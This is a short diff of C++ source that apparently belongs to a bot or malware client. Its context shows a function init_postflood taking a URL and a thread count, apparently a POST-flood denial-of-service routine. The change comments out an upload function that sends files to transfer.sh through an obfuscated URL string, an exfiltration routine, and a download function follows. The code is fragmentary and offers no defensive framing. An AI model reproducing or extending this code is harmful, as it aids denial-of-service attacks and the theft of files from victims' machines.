@@ -425,7 +425,7 @@ void init_postflood(std::string URL, int threads) {
     }
 }
 
-std::string upload(std::string filename, std::string body) {
+/*std::string upload(std::string filename, std::string body) {
     std::string path_req;
 
     httplib::Client c = ClientFactory(OBFUSCATED("https://transfer.sh/") + filename, path_req);
@@ -436,7 +436,7 @@ std::string upload(std::string filename, std::string body) {
     else {
         return "";
     }
-}
+}*/
 
 void download(std::string URL, std::string filename) {
     std::string path_req;
